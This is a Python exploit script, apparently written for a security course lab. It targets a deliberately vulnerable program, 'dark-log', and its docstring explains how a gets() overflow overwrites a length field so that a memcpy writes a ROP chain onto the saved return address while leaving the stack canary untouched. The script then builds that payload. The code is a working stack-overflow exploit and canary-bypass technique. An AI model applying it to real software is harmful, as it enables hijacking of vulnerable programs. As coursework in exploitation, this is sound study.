#!/usr/bin/env python3
"""Task 4: canary-bypass exploit for attack/dark-log.

Goal: make dark-log print "Hope A will be your grade!" without triggering the
stack protector (canary).

The vulnerability
-----------------
dark-log.c:

    struct log_frame {
      char expression[128];   // offset   0
      char logMsg[128];       // offset 128
      int  len;               // offset 256
      char pad[8];            // offset 260
    };

    void input(void) {
      struct log_frame f;
      f.len = 0;
      gets(f.expression);                          // unbounded read
      memcpy(f.logMsg + f.len, f.expression, 128); // uses (overwritten) f.len
    }

`f.len` lives at a HIGHER address than `f.expression`, so `gets` can overwrite
it.  We set `f.len = 0xa8` (168) so that

    f.logMsg + f.len == (rbp - 0xa0) + 0xa8 == rbp + 0x8

i.e. the destination of the 128-byte `memcpy` is exactly the saved return
address of `input()`.  The copy therefore overwrites the return address (and
128 bytes above it) while leaving the canary (at rbp-0x8) and the saved rbp
(at rbp) untouched.

The first 128 bytes of `f.expression` are our ROP chain, which `memcpy`
places at rbp+0x8:

    pop rdi; ret  (0x4018a3)  ->  rdi = 4
    4
    ret           (0x4018a4)  ->  fix stack alignment for printf
    grade_eval    (0x401677)  ->  prints "Hope A will be your grade!"
    ret           (0x4018a4)  ->  grade_eval returns here
    0                          ->  then ret to NULL (terminates)

Gadgets come from the `__libc_csu_init` epilogue tail `41 5f c3`:

    4018a2: 41 5f     pop %r15
    4018a4: c3        ret

so `pop rdi; ret` = 0x4018a3 and `ret` = 0x4018a4.
"""
import sys

pop_rdi_ret = 0x4018A3
ret_gadget = 0x4018A4
grade_eval = 0x401677

# The 128-byte ROP chain that memcpy copies onto the return address.
rop = b"".join(
    addr.to_bytes(8, "little")
    for addr in (pop_rdi_ret, 4, ret_gadget, grade_eval, ret_gadget, 0)
)
assert len(rop) <= 128
rop = rop.ljust(128, b"A")

# gets() writes: 128-byte expression (ROP), 128-byte logMsg (filler), then the
# 4-byte int f.len = 0xa8.  This stops before the canary at offset 280.
payload = rop + b"B" * 128 + (0xA8).to_bytes(4, "little")

sys.stdout.buffer.write(payload)
